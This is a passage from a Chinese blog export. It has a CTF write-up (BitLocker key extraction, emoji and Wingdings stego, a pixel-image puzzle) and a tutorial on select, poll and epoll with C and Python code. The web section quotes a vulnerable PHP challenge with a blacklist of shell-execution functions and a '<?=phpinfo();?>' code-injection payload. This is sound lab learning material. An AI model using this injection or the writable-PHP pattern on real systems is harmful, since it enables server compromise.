functionality.","categories":[{"name":"Python学习","slug":"Python学习","permalink":"https://zwh-china.github.io/categories/Python%E5%AD%A6%E4%B9%A0/"}],"tags":[]},{"title":"红帽杯wp","slug":"红帽杯","date":"2021-05-14T12:43:47.000Z","updated":"2021-05-16T08:47:20.315Z","comments":true,"path":"2021/05/14/红帽杯/","link":"","permalink":"https://zwh-china.github.io/2021/05/14/%E7%BA%A2%E5%B8%BD%E6%9D%AF/","excerpt":"","text":"蓝帽杯Misc bitlocker 嫌疑人X的硬盘遇到bitlocker，我目前遇到的两类题型。通过软件爆破密码，或者通过diskgenius来得到隐藏分区表，或者看到隐藏分区内容。也可能是通过diskgenius来还原丢失文件。这题需要使用后者重建分区表得到bitlocker恢复密钥分区 官方wp给的一个方法是，部分bitlocker加密时会生成恢复密钥串，每6位数字一组，加上横杠正好55位字符。48个数字，7个横杠。加之查看计算机管理-磁盘管理。发现存在着未分配空间，猜想存在密钥。所以写个Python脚本提取。这里的exp应该是通用的。因此在此处记录一下 from re import * def getBitLockerpwd(): with open(&#39;./xxx.vmdk&#39;,&#39;rb&#39;) as f: info = f.read() info = info.replace(&#39;\\x00&#39;,&#39;&#39;) reg = compile(r&#39;[0-9_-]&#123;55&#125;&#39;) print(reg.findall(info)) Misc 冬奥会_is_coming 拿到附件图片。反手binwalk。分理出三个文件 打开第一个压缩包，发现 右侧提示8个数字。结合音频考虑音频隐写。 复现好像找到了个挺牛的toolkithttps://github.com/DominicBreuker/stego-toolkit 结合题目，猜测8位密码是2022北京冬奥会日期即20220204。使用mp3stego解密 \\xe2\\x9c\\x8c\\xef\\xb8\\x8e \\xe2\\x98\\x9d\\xef\\xb8\\x8e\\xe2\\x99\\x93\\xef\\xb8\\x8e\\xe2\\xa7\\xab\\xef\\xb8\\x8e\\xe2\\x98\\x9f\\xef\\xb8\\x8e\\xe2\\x97\\x86\\xef\\xb8\\x8e\\xe2\\x99\\x8c\\xef\\xb8\\x8e \\xe2\\x9d\\x92\\xef\\xb8\\x8e\\xe2\\x99\\x8f\\xef\\xb8\\x8e\\xe2\\x97\\xbb\\xef\\xb8\\x8e\\xe2\\x96\\xa1\\xef\\xb8\\x8e\\xe2\\xac\\xa7\\xef\\xb8\\x8e\\xe2\\x99\\x93\\xef\\xb8\\x8e\\xe2\\xa7\\xab\\xef\\xb8\\x8e\\xe2\\x96\\xa1\\xef\\xb8\\x8e\\xe2\\x9d\\x92\\xef\\xb8\\x8e\\xe2\\x8d\\x93\\xef\\xb8\\x8e \\xe2\\x96\\xa0\\xef\\xb8\\x8e\\xe2\\x99\\x8b\\xef\\xb8\\x8e\\xe2\\x9d\\x8d\\xef\\xb8\\x8e\\xe2\\x99\\x8f\\xef\\xb8\\x8e\\xe2\\x99\\x8e\\xef\\xb8\\x8e \\xf0\\x9f\\x93\\x82\\xef\\xb8\\x8e\\xe2\\x99\\x8d\\xef\\xb8\\x8e\\xe2\\x99\\x8f\\xef\\xb8\\x8e\\xf0\\x9f\\x8f\\xb1\\xef\\xb8\\x8e\\xe2\\x99\\x8f\\xef\\xb8\\x8e\\xe2\\x99\\x8b\\xef\\xb8\\x8e\\xf0\\x9f\\x99\\xb5 \\xe2\\x99\\x93\\xef\\xb8\\x8e\\xe2\\xac\\xa7\\xef\\xb8\\x8e \\xe2\\x9d\\x96\\xef\\xb8\\x8e\\xe2\\x99\\x8f\\xef\\xb8\\x8e\\xe2\\x9d\\x92\\xef\\xb8\\x8e\\xe2\\x8d\\x93\\xef\\xb8\\x8e \\xe2\\x99\\x93\\xef\\xb8\\x8e\\xe2\\x96\\xa0\\xef\\xb8\\x8e\\xe2\\xa7\\xab\\xef\\xb8\\x8e\\xe2\\x99\\x8f\\xef\\xb8\\x8e\\xe2\\x9d\\x92\\xef\\xb8\\x8e\\xe2\\x99\\x8f\\xef\\xb8\\x8e\\xe2\\xac\\xa7\\xef\\xb8\\x8e\\xe2\\xa7\\xab\\xef\\xb8\\x8e\\xe2\\x99\\x93\\xef\\xb8\\x8e\\xe2\\x96\\xa0\\xef\\xb8\\x8e\\xe2\\x99\\x91\\xef\\xb8\\x8e\\xf0\\x9f\\x93\\xac\\xef\\xb8\\x8e \\xf0\\x9f\\x95\\x88\\xef\\xb8\\x8e\\xe2\\x99\\x92\\xef\\xb8\\x8e\\xe2\\x8d\\x93\\xef\\xb8\\x8e \\xe2\\x96\\xa0\\xef\\xb8\\x8e\\xe2\\x96\\xa1\\xef\\xb8\\x8e\\xe2\\xa7\\xab\\xef\\xb8\\x8e \\xe2\\xa7\\xab\\xef\\xb8\\x8e\\xe2\\x99\\x8b\\xef\\xb8\\x8e\\xf0\\x9f\\x99\\xb5\\xe2\\x99\\x8f\\xef\\xb8\\x8e \\xe2\\x99\\x8b\\xef\\xb8\\x8e \\xe2\\x97\\x8f\\xef\\xb8\\x8e\\xe2\\x96\\xa1\\xef\\xb8\\x8e\\xe2\\x96\\xa1\\xef\\xb8\\x8e\\xf0\\x9f\\x99\\xb5 \\xe2\\x99\\x8b\\xef\\xb8\\x8e\\xe2\\xa7\\xab\\xef\\xb8\\x8e \\xe2\\x99\\x93\\xef\\xb8\\x8e\\xe2\\xa7\\xab\\xef\\xb8\\x8e\\xe2\\x9c\\x8d\\xef\\xb8\\x8e 此为UTF-8编码，考虑用py将其解析为unicode显示。将内容存储至bytes数组。再decode utf-8即可得到以下内容 ✌︎ ☝︎♓︎⧫︎☟︎◆︎♌︎ ❒︎♏︎◻︎□︎⬧︎♓︎⧫︎□︎❒︎⍓︎ ■︎♋︎❍︎♏︎♎︎ 📂︎♍︎♏︎🏱︎♏︎ ♋︎🙵 ♓︎⬧︎ ❖︎♏︎❒︎⍓︎ ♓︎■︎⧫︎♏︎❒︎♏︎⬧︎⧫︎♓︎■︎♑︎📬︎ 🕈︎♒︎⍓︎ ■︎□︎⧫︎ ⧫︎♋︎🙵♏︎ ♋︎ ●︎□︎□︎🙵 ♋︎⧫︎ ♓︎⧫︎✍︎ 根据经验和搜索确定该字体为所谓WINGDING字体 网址为https://lingojam.com/WingDing即可在线转码 🙃💵🌿🎤🚪🌏🐎🥋🚫😆🎃✅⌨🔪❓🚫🐍🙃🔬✉👁😆🎈🐘🏎🐘🐘😂😎🎅🖐🐍✉🍌🌪🐎🍵✅🚪✖☃👣👉ℹ🔪🍎🔄👣🚪😁👣💵🐅🍵🔬🛩😇🖐🖐🎅✅🏎👌🚨😆🎤🎅🦓🌿🦓🙃✖🍌🛩😂👑🌏☃😇😍🛩🚹😀🍌🎈💧🗒🗒 这波编码直接把我晕死 去作者github仓库找到密钥 How_6ad_c0uld_a_1cePeak_be?结合emoji考虑emoji-aes https://aghorler.github.io/emoji-aes/ 得到flagflag&#123;e32f619b-dbcd-49bd-9126-5d841aa01767&#125; 题外之音 ASCII UTF-8 Unicode的关系和区别 UTF-8是Unicode的一种实现方式，Unicode只规定了每个符号的编码，却没有规定如何存储。而UTF-8则规定其具体表示方式，即可变长编码方式1-4字节表示一种符号。例如中文中的’严‘的Unicode编码是4E25，UTF-8编码则为E4B8A5,最简单的，通过txt另存为时改变存储编码即可简单的进行UTF-8和Unicode编码之间的转换。除了UTF-8还有UTF-16,UTF-32。其不同在于字符用几个字节表示。 至于ASCII，是上世纪60年代，美国制定的一套字符编码，对英语和二进制位之间的关系做了统一规定。一共规定了128个符号。包含32个不可见的控制字符。其只占用1Byte中8bit的后7位第一位统一规定用0填充。 红帽杯misc 签到flag被EBCDIC编码。使用ultraedit-&gt;高级-&gt;编码即可转换为flag web find_it访问robots.txt得到1ndexx.php直接访问没东西。结合之前一道题power_off猜测可能是vim临时文件一类。访问.1ndexx.php.swp得到源码 &lt;?php $link = mysql_connect(&#39;localhost&#39;, &#39;root&#39;); ?&gt; &lt;html&gt; &lt;head&gt; &lt;title&gt;Hello worldd!&lt;/title&gt; &lt;style&gt; body &#123; background-color: white; text-align: center; padding: 50px; font-family: &quot;Open Sans&quot;,&quot;Helvetica Neue&quot;,Helvetica,Arial,sans-serif; &#125; #logo &#123; margin-bottom: 40px; &#125; &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;img id=&quot;logo&quot; src=&quot;logo.png&quot; /&gt; &lt;h1&gt;&lt;?php echo &quot;Hello My freind!&quot;; ?&gt;&lt;/h1&gt; &lt;?php if($link) &#123; ?&gt; &lt;h2&gt;I Can&#39;t view my php files?!&lt;/h2&gt; &lt;?php &#125; else &#123; ?&gt; &lt;h2&gt;MySQL Server version: &lt;?php echo mysql_get_server_info(); ?&gt;&lt;/h2&gt; &lt;?php &#125; ?&gt; &lt;/body&gt; &lt;/html&gt; &lt;?php #Really easy... $file=fopen(&quot;flag.php&quot;,&quot;r&quot;) or die(&quot;Unable 2 open!&quot;); $I_know_you_wanna_but_i_will_not_give_you_hhh = fread($file,filesize(&quot;flag.php&quot;)); $hack=fopen(&quot;hack.php&quot;,&quot;w&quot;) or die(&quot;Unable 2 open&quot;); $a=$_GET[&#39;code&#39;]; if(preg_match(&#39;/system|eval|exec|base|compress|chr|ord|str|replace|pack|assert|preg|replace|create|function|call|\\\\~|\\\\^|\\\\`|flag|cat|tac|more|tail|echo|require|include|proc|open|read|shell|file|put|get|contents|dir|link|dl|var|dump/&#39;,$a))&#123; die(&quot;you die&quot;); &#125; if(strlen($a)&gt;33)&#123; die(&quot;nonono.&quot;); &#125; fwrite($hack,$a); fwrite($hack,$I_know_you_wanna_but_i_will_not_give_you_hhh); fclose($file); fclose($hack); ?&gt; 会在过滤后，把get到的内容读取到hack.php这里意外用/index.php?code=&lt;?=phpinfo();?&gt;访问phpinfo读到flag misc colorfulcode这题下来就俩文件，一个data1，一个data2.其中data1为 简直毫无头绪 data2 其实说是在。这玩意简直看不出来。看了题解才知道咋做。第二个后部分大部分为三个重复相同数据。考虑可能为rgb数据。将其挨个提取，转换为16进制。再根据data1的数字，数字表示对应像素下标。然后提取data2像素根据data1数量，质因数分解推测出图片长高，进而还原。 import binascii from PIL import Image f_data1 = open(&#39;./data1&#39;,&#39;r&#39;).read() data1 = f_data1.split(&#39; &#39;)[:-1] with open(&#39;./data2&#39;,mode=&#39;rb&#39;) as f: #print(f.read()) #print(binascii.hexlify(f.read())) # data=binascii.hexlify(f.read()).decode() data = f.read() print(data) rgb = [] for i in range(0, len(data), 3): r = data[i] g = data[i + 1] b = data[i + 2] rgb.append ((r, g, b)) print(rgb) img = Image.new(&#39;RGB&#39;,(37,191),(255,255,255)) for i in range(37): for j in range(191): img.putpixel((i,j),rgb[int(data1[i*191+j])]) img.show() img.save(&#39;flag.png&#39;) 这部如果还原出来，明显感觉有东西。但是还是没法得到flag。需要知道一个知识点，就是Colorful programming。将此图片上传至网站https://www.bertnase.de/npie即可得到数据88842f20-fb8c-45c9-ae8f-36135b6a0f11","categories":[{"name":"我不为人知的日常","slug":"我不为人知的日常","permalink":"https://zwh-china.github.io/categories/%E6%88%91%E4%B8%8D%E4%B8%BA%E4%BA%BA%E7%9F%A5%E7%9A%84%E6%97%A5%E5%B8%B8/"}],"tags":[]},{"title":"python IO多路复用","slug":"python IO多路复用","date":"2021-05-02T17:56:29.000Z","updated":"2021-05-02T18:00:25.528Z","comments":true,"path":"2021/05/03/python IO多路复用/","link":"","permalink":"https://zwh-china.github.io/2021/05/03/python%20IO%E5%A4%9A%E8%B7%AF%E5%A4%8D%E7%94%A8/","excerpt":"","text":"前言最近正在写一个端口映射小程序。主要实现内网的端口转发功能。拿80端口的Apache举例来说，就是我在一个没有公网IP的内网建立了一个Apache服务器，但是这个web服务只能被内网访问，但是通过端口映射就能够通过有公网IP的服务器访问到本地的80端口服务 大概原理就是写了一个反向代理，通过反代数据来达到端口映射的效果。但是这种场景下单一的多线程已经满足不了我对性能的要求，进而我去了解了UNIX下的五种I/O模型，准备拿I/O多路复用的epoll来解决我的问题 最初的构想是，当服务器接到一个请求，客户端就会开一个套接字并把其放入一个线程去处理。相当于每有一个连接，我就会单独开一个线程。这样会使得程序的效率大大下降。因为在创建新线程时会涉及到上下文切换和内存的共享。所以我需要除了线程外的方法来解决这个问题 Unix下五大I/O模型 Blocking I/O Non-blocking I/O I/O multiplexing (select/poll/epoll) Signal-driven (Sigio) Asynchronous I/O (POSIX aio_ series functions) 阻塞式IO阻塞式就是最常见的socket用法。 data = skt.recv(Buffer_Size) 这种接收默认下是阻塞的，在运行到这个函数后会执行系统调用，即从用户态到内核态的转换。此时就会阻塞等到内核返回数据内容。 非阻塞式IO非阻塞即设置skt.setblocking(True)此时套接字便不会阻塞。在每次尝试recv(Buffer_Size)时回去问内核有没有数据，没有数据内核会返回错误，而不是等待数据到来 多路复用IO这个是这次了解的重点。 select select( ) select在python中的定义是select.select(rlist, wlist, xlist[,timeout])这个函数提供了直接面向Unix系统中select()系统调用的接口，其中前三个参数是等待对象的 iterable: either integers representing file descriptors or objects with a parameterless method named fileno() returning such an integer: rlist: wait until ready for reading wlist: wait until ready for writing xlist: wait for an “exceptional condition” (see the manual page for what your system considers such a condition) Empty iterables are allowed, but acceptance of three empty iterables is platform-dependent. (It is known to work on Unix but not on Windows.) The optional timeout argument specifies a time-out as a floating point number in seconds. When the timeout argument is omitted the function blocks until at least one file descriptor is ready. A time-out value of zero specifies a poll and never blocks. The return value is a triple of lists of objects that are ready: subsets of the first three arguments. When the time-out is reached without a file descriptor becoming ready, three empty lists are returned. Among the acceptable object types in the iterables are Python file objects (e.g. sys.stdin, or objects returned by open() or os.popen()), socket objects returned by socket.socket(). You may also define a wrapper class yourself, as long as it has an appropriate fileno() method (that really returns a file descriptor, not just a random integer). Note File objects on Windows are not acceptable, but sockets are. On Windows, the underlying select() function is provided by the WinSock library, and does not handle file descriptors that don’t originate from WinSock. 说白了就是文件描述符fd，当然由于Python封装的特性，也可以传入套接字对象，函数会自动调用套接字对象中的fileno方法来间接获取fd这个函数在win下不能接受对象类型除了套接字对象(也就是普通的那种文件对象不行了)。然后超时参数默认是无限久也就是阻塞，如果设置超时时间，若在时间内没有获取到就会返回空List。那么也就顺便得知select()返回的类型是三个List。特别的如果超时时间为0，则表示直接不阻塞，说明这是一个poll。同时select()也是select pool epool中唯一可以在win上用的函数。可能是因为win下的I/O模型不同导致的。 看了别人的视屏教程我反而觉得select()的用法更适合用C来展现 先看select()的函数原型 int select(int nfds, fd_set *readfds, fd_set *writefds, fd_set *exceptfds, struct timeval *timeout); 可以看到select()函数接受一个最大文件描述符，另三个主要参数是存储了文件描述符的bitmap分别表示读，写，异常，和超时时间 再看下以socket为例子的代码 fd_set rset; sockfd = socket(AF_INET, SOCK_STREAM, 0); memset(&amp;addr, 0, sizeof (addr)); addr.sin_family = AF_INET; addr.sin_port = htons(2000); addr.sin_addr.s_addr = INADDR_ANY; bind(sockfd,(struct sockaddr*)&amp;addr ,sizeof(addr)); listen (sockfd, 5); for (i=0;i&lt;5;i++) &#123; memset(&amp;client, 0, sizeof (client)); addrlen = sizeof(client); fds[i] = accept(sockfd,(struct sockaddr*)&amp;client, &amp;addrlen); if(fds[i] &gt; max) max = fds[i]; &#125; while(1)&#123; FD_ZERO(&amp;rset); for (i = 0; i&lt; 5; i++ ) &#123; FD_SET(fds[i],&amp;rset); &#125; puts(&quot;round again&quot;); select(max+1, &amp;rset, NULL, NULL, NULL); for(i=0;i&lt;5;i++) &#123; if (FD_ISSET(fds[i], &amp;rset))&#123; memset(buffer,0,MAXBUF); read(fds[i], buffer, MAXBUF); puts(buffer); &#125; &#125; &#125; 首先是创建了一个普通的TCP监听socket设置了最大监听量是5，循环accept，直到建立了5个连接的套接字，这里注意c语言accept返回的就直接是一个int类型的fd(文件描述符)而不是Python中的socket对象。然后记录下了文件描述符的最大值。然后把文件描述符放到一个bitmap里去也就是FD_SET(fds[i],&amp;rset);bitmap的结构类似一个数组，默认值全是0，若收到的5个fd分别为 1 2 3 4 5则会在bitmap中把对应的1 2 3 4 5位由0变成1。然后调用select()函数，传入参数最大的fd+1(具体为啥要加1可以认为是bitmap是一个数组从0存储所以需要加1)和储存了文件描述符的bitmap。当select()返回说明有socket可以接受数据了，这中间其实是用户态把bitmap利用mmap映射到内核，然后由内核轮询直到发现有数据来了，便会对bitmap中的描述符置位也就是类似插一个小旗子(flag)表明是这个fd有数据来了，便进行遍历判断是哪一位变了，然后进行读取。这最后遍历这部在python中似乎被直接完成了，因为python的select是有返回值的，返回的便是可以recv()的套接字对象。从这里也能看出Python是高度封装的语言，它把这种细节封装起来，使得我们写代码不必在意细枝末节。而c虽然略显复杂，却能很好展示select()的处理过程。 优点：1) 在c语言中它的优点就是它轮询的过程(检测socket是否有数据可接受)是在内核中进行，而非我自己用一个非阻塞IO去while True循环来反复进行用户态-内核态切换来占用开销。 缺点，1)在32位下bitmap大小默认是1024在64位下是2048也就是bitmap大小受限 2)在每次select后还得手动遍历，有O(n)复杂度 Python样例代码 #!/usr/bin/python # -*- coding: utf-8 -*- import select import socket import Queue server = socket.socket(socket.AF_INET,socket.SOCK_STREAM) server.setblocking(False) server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR , 1) server_address= (&#39;192.168.1.5&#39;,8080) server.bind(server_address) server.listen(10) #select轮询等待读socket集合 inputs = [server] #select轮询等待写socket集合 outputs = [] message_queues = &#123;&#125; #select超时时间 timeout = 20 while True: print &quot;等待活动连接......&quot; readable , writable , exceptional = select.select(inputs, outputs, inputs, timeout) if not (readable or writable or exceptional) : print &quot;select超时无活动连接，重新select...... &quot; continue; #循环可读事件 for s in readable : #如果是server监听的socket if s is server: #同意连接 connection, client_address = s.accept() print &quot;新连接： &quot;, client_address connection.setblocking(0) #将连接加入到select可读事件队列 inputs.append(connection) #新建连接为key的字典，写回读取到的消息 message_queues[connection] = Queue.Queue() else: #不是本机监听就是客户端发来的消息 data = s.recv(1024) if data : print &quot;收到数据：&quot; , data , &quot;客户端：&quot;,s.getpeername() message_queues[s].put(data) if s not in outputs: #将读取到的socket加入到可写事件队列 outputs.append(s) else: #空白消息，关闭连接 print &quot;关闭连接：&quot;, client_address if s in outputs : outputs.remove(s) inputs.remove(s) s.close() del message_queues[s] for s in writable: try: msg = message_queues[s].get_nowait() except Queue.Empty: print &quot;连接：&quot; , s.getpeername() , &#39;消息队列为空&#39; outputs.remove(s) else: print &quot;发送数据：&quot; , msg , &quot;到&quot;, s.getpeername() s.send(msg) for s in exceptional: print &quot;异常连接：&quot;, s.getpeername() inputs.remove(s) if s in outputs: outputs.remove(s) s.close() del message_queues[s] poll pool( ) The poll() system call, supported on most Unix systems, provides better scalability for network servers that service many, many clients at the same time. poll() scales better because the system call only requires listing the file descriptors of interest, while select() builds a bitmap, turns on bits for the fds of interest, and then afterward the whole bitmap has to be linearly scanned again. select() is O(highest file descriptor), while poll() is O(number of file descriptors) 在python文档里也直接讲明了效率的差异在大部分情况下poll比select更好。因为poll()的系统调用只需要一个感兴趣也就是需要监听的文件描述符清单。而非是像select()一样需要建立一个bitmap并且需要对整个bitmap进行线性扫描。 先看看poll()的c语言函数原型 int poll (struct pollfd *fds, unsigned int nfds, int timeout); 明显比select()简洁不少，它接收一个有关文件描述符的结构体，一个正整数表示文件描述符数量，和一个超时时间 再看下样例代码 struct pollfd &#123; int fd; short events; short revents; &#125;; for (i=0;i&lt;5;i++) &#123; memset(&amp;client, 0, sizeof (client)); addrlen = sizeof(client); pollfds[i].fd = accept(sockfd,(struct sockaddr*)&amp;client, &amp;addrlen); pollfds[i].events = POLLIN; &#125; sleep(1); while(1)&#123; puts(&quot;round again&quot;); poll(pollfds, 5, 50000); for(i=0;i&lt;5;i++) &#123; if (pollfds[i].revents &amp; POLLIN)&#123; pollfds[i].revents = 0; memset(buffer,0,MAXBUF); read(pollfds[i].fd, buffer, MAXBUF); puts(buffer); &#125; &#125; &#125; 对于每一个文件描述符，我们都为其创建一个pollfd对象，其中fd参数就是文件描述符，events表示poll事件，是预定好的 事件 描述 是否可作为输入（events） 是否可作为输出（revents） POLLIN 数据可读（包括普通数据&amp;优先数据） 是 是 POLLOUT 数据可写（普通数据&amp;优先数据） 是 是 POLLRDNORM 普通数据可读 是 是 POLLRDBAND 优先级带数据可读（linux不支持） 是 是 POLLPRI 高优先级数据可读，比如TCP带外数据 是 是 POLLWRNORM 普通数据可写 是 是 POLLWRBAND 优先级带数据可写 是 是 POLLRDHUP TCP连接被对端关闭，或者关闭了写操作，由GNU引入 是 是 POPPHUP 挂起 否 是 POLLERR 错误 否 是 POLLNVAL 文件描述符没有打开 否 是 调用poll()后阻塞，若返回只需要遍历遍历文件描述符数量，将其revents重置为0，并对对应fd进行读取。 Poll vs Select poll( ) does not require that the user calculate the value of the highest- numbered file descriptor +1 poll( ) is more efficient for large-valued file descriptors. Imagine watching a single file descriptor with the value 900 via select()—the kernel would have to check each bit of each passed-in set, up to the 900th bit. select( )’s file descriptor sets are statically sized. With select( ), the file descriptor sets are reconstructed on return, so each subsequent call must reinitialize them. The poll( ) system call separates the input (events field) from the output (revents field), allowing the array to be reused without change. The timeout parameter to select( ) is undefined on return. Portable code needs to reinitialize it. This is not an issue with pselect( ) select( ) is more portable, as some Unix systems do not support poll( ) 这里其实还有一点，相较于之前的select，select每次需要构建一个bitmap，当每次select返回后，由于内核的置位，导致bitmap被直接更改了，所以再下次select前，必须重新初始化bitmap。这就造成其重用性较差。但是poll就不一样，我们只需要在处理文件描述符的时候顺手把revents给重新变为0即可。还有一点就是select的bitmap在被返回前所有没收到数据的位都被置为0，所以相当于其本身被改变了，所以没法类似poll这样给它变为0，只能乖乖重新生成。 再看Python对poll描述的官方文档 poll.register(fd[, eventmask]) Register a file descriptor with the polling object. Future calls to the poll() method will then check whether the file descriptor has any pending I/O events. fd can be either an integer, or an object with a fileno() method that returns an integer. File objects implement fileno(), so they can also be used as the argument. eventmask is an optional bitmask describing the type of events you want to check for, and can be a combination of the constants POLLIN, POLLPRI, and POLLOUT, described in the table below. If not specified, the default value used will check for all 3 types of events. Constant Meaning POLLIN There is data to read POLLPRI There is urgent data to read POLLOUT Ready for output: writing will not block POLLERR Error condition of some sort POLLHUP Hung up POLLRDHUP Stream socket peer closed connection, or shut down writing half of connection POLLNVAL Invalid request: descriptor not open Registering a file descriptor that’s already registered is not an error, and has the same effect as registering the descriptor exactly once. poll.modify(fd, eventmask) Modifies an already registered fd. This has the same effect as register(fd, eventmask). Attempting to modify a file descriptor that was never registered causes an OSError exception with errno ENOENT to be raised. Constant Meaning POLLIN There is data to read POLLPRI There is urgent data to read POLLOUT Ready for output: writing will not block POLLERR Error condition of some sort POLLHUP Hung up POLLRDHUP Stream socket peer closed connection, or shut down writing half of connection POLLNVAL Invalid request: descriptor not open poll.unregister(fd) Remove a file descriptor being tracked by a polling object. Just like the register() method, fd can be an integer or an object with a fileno() method that returns an integer. Attempting to remove a file descriptor that was never registered causes a KeyError exception to be raised. poll.poll([timeout]) Polls the set of registered file descriptors, and returns a possibly-empty list containing (fd, event) 2-tuples for the descriptors that have events or errors to report. fd is the file descriptor, and event is a bitmask with bits set for the reported events for that descriptor — POLLIN for waiting input, POLLOUT to indicate that the descriptor can be written to, and so forth. An empty list indicates that the call timed out and no file descriptors had any events to report. If timeout is given, it specifies the length of time in milliseconds which the system will wait for events before returning. If timeout is omitted, negative, or None, the call will block until there is an event for this poll object. Changed in version 3.5: The function is now retried with a recomputed timeout when interrupted by a signal, except if the signal handler raises an exception (see PEP 475 for the rationale), instead of raising InterruptedError. 首先需要去poll.register()一下，参数自然是文件描述符和event，然后特殊的，如果不指定event则会三种event都会被作为默认参数传入。poll.modify()就是去修改已经被poll.register()的文件描述符。至于poll.unregister()就不说了，取消一个已经注册的文件描述符。最后万事俱备，都注册完了就去调用poll.poll()去监测。其中的超时默认是阻塞，如果显式传入负数或者None也会是阻塞的，默认单位是毫秒。 Python2样例代码 #!/usr/bin/python # -*- coding: utf-8 -*- import socket import select import Queue server = socket.socket(socket.AF_INET, socket.SOCK_STREAM) server.setblocking(False) server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) server_address = (&quot;192.168.1.5&quot;, 8080) server.bind(server_address) server.listen(5) print &quot;服务器启动成功，监听IP：&quot; , server_address message_queues = &#123;&#125; #超时，毫秒 timeout = 5000 #监听哪些事件 READ_ONLY = ( select.POLLIN | select.POLLPRI | select.POLLHUP | select.POLLERR) READ_WRITE = (READ_ONLY|select.POLLOUT) #新建轮询事件对象 poller = select.poll() #注册本机监听socket到等待可读事件事件集合 poller.register(server,READ_ONLY) #文件描述符到socket映射 fd_to_socket = &#123;server.fileno():server,&#125; while True: print &quot;等待活动连接......&quot; #轮询注册的事件集合 events = poller.poll(timeout) if not events: print &quot;poll超时，无活动连接，重新poll......&quot; continue print &quot;有&quot; , len(events), &quot;个新事件，开始处理......&quot; for fd ,flag in events: s = fd_to_socket[fd] #可读事件 if flag &amp; (select.POLLIN | select.POLLPRI) : if s is server : #如果socket是监听的server代表有新连接 connection , client_address = s.accept() print &quot;新连接：&quot; , client_address connection.setblocking(False) fd_to_socket[connection.fileno()] = connection #加入到等待读事件集合 poller.register(connection,READ_ONLY) message_queues[connection] = Queue.Queue() else : #接收客户端发送的数据 data = s.recv(1024) if data: print &quot;收到数据：&quot; , data , &quot;客户端：&quot; , s.getpeername() message_queues[s].put(data) #修改读取到消息的连接到等待写事件集合 poller.modify(s,READ_WRITE) else : # Close the connection print &quot; closing&quot; , s.getpeername() # Stop listening for input on the connection poller.unregister(s) s.close() del message_queues[s] #连接关闭事件 elif flag &amp; select.POLLHUP : print &quot; Closing &quot;, s.getpeername() ,&quot;(HUP)&quot; poller.unregister(s) s.close() #可写事件 elif flag &amp; select.POLLOUT : try: msg = message_queues[s].get_nowait() except Queue.Empty: print s.getpeername() , &quot; queue empty&quot; poller.modify(s,READ_ONLY) else : print &quot;发送数据：&quot; , data , &quot;客户端：&quot; , s.getpeername() s.send(msg) #异常事件 elif flag &amp; select.POLLERR: print &quot; exception on&quot; , s.getpeername() poller.unregister(s) s.close() del message_queues[s] epollepoll在c语言下主要由三个比较主要的函数组成epoll_create()、epoll_ctl、epoll_wait()组成。限于篇幅原因，不列出其函数原型。可以参考https://blog.csdn.net/silly1195056983/article/details/112692781 看下c语言给的样例 struct epoll_event events[5]; int epfd = epoll_create(10); ... ... for (i=0;i&lt;5;i++) &#123; static struct epoll_event ev; memset(&amp;client, 0, sizeof (client)); addrlen = sizeof(client); ev.data.fd = accept(sockfd,(struct sockaddr*)&amp;client, &amp;addrlen); ev.events = EPOLLIN; epoll_ctl(epfd, EPOLL_CTL_ADD, ev.data.fd, &amp;ev); &#125; while(1)&#123; puts(&quot;round again&quot;); nfds = epoll_wait(epfd, events, 5, 10000); for(i=0;i&lt;nfds;i++) &#123; memset(buffer,0,MAXBUF); read(events[i].data.fd, buffer, MAXBUF); puts(buffer); &#125; &#125; 先用epoll_create()创建10个位置，用于监听文件描述符。再用类似poll的结构体存储fd和监听事件，注意这里没有revents，然后调用epoll_ctl()传入epoll_create()创建的监听列表，设置增加操作类型，传入文件描述符和事件类型。然后重复5次，表明监听5个socket文件描述符，然后调用epoll_wait()来进行阻塞等待，等待完后，只需要遍历epoll_wait()返回的序号进行对应读取。不需要像poll一样重置事件。 Epoll vs Select/Poll We can add and remove file descriptor while waiting epoll_wait returns only the objects with ready file descriptors epoll has better performance – O(1) instead of O(n) epoll can behave as level triggered or edge triggered (see man page) epoll is Linux specific so non portable 其实epoll_create()创建的是一个红黑树，epoll_ctl()是对红黑树进行操作。这里的置位操作也有但是和poll()不太一样，因为epoll()没有revents。这里具体是如何操作的回头学了再补上，我看的视频对这个部分具体如何置位有争议。然后还有就是，这个给的例子是epoll()的水平触发还有一种边缘触发。这个似乎挺复杂的记录几个讲这个的url。回头去看 https://blog.csdn.net/qq_34793133/article/details/82055915 https://zhuanlan.zhihu.com/p/107995399 具体用c来说设置水平触发和边缘触发是在 //水平触发 evt.events = EPOLLIN; // LT 水平触发 (默认) EPOLLLT evt.data.fd = pfd[0]; //边沿触发 evt.events = EPOLLIN | EPOLLET; // ET 边沿触发 evt.data.fd = pfd[0]; LT/ET应该就是分别代表，Level Trigger和Edge Trigger，也就是在设置事件和传入epoll_ctl()时设置。 至于这俩有啥区别和什么时候用，上面放的两个url中CSDN的标题就是浅析epoll的水平触发和边缘触发，以及边缘触发为什么要使用非阻塞IO这里再引用部分作者的文章内容 我们通俗一点讲： Level_triggered(水平触发)：当被监控的文件描述符上有可读写事件发生时，epoll_wait()会通知处理程序去读写。如果这次没有把数据一次性全部读写完(如读写缓冲区太小)，那么下次调用 epoll_wait()时，它还会通知你在上没读写完的文件描述符上继续读写，当然如果你一直不去读写，它会一直通知你！！！如果系统中有大量你不需要读写的就绪文件描述符，而它们每次都会返回，这样会大大降低处理程序检索自己关心的就绪文件描述符的效率！！！ Edge_triggered(边缘触发)：当被监控的文件描述符上有可读写事件发生时，epoll_wait()会通知处理程序去读写。如果这次没有把数据全部读写完(如读写缓冲区太小)，那么下次调用epoll_wait()时，它不会通知你，也就是它只会通知你一次，直到该文件描述符上出现第二次可读写事件才会通知你！！！这种模式比水平触发效率高，系统不会充斥大量你不关心的就绪文件描述符！！！ 阻塞IO：当你去读一个阻塞的文件描述符时，如果在该文件描述符上没有数据可读，那么它会一直阻塞(通俗一点就是一直卡在调用函数那里)，直到有数据可读。当你去写一个阻塞的文件描述符时，如果在该文件描述符上没有空间(通常是缓冲区)可写，那么它会一直阻塞，直到有空间可写。以上的读和写我们统一指在某个文件描述符进行的操作，不单单指真正的读数据，写数据，还包括接收连接accept()，发起连接connect()等操作... 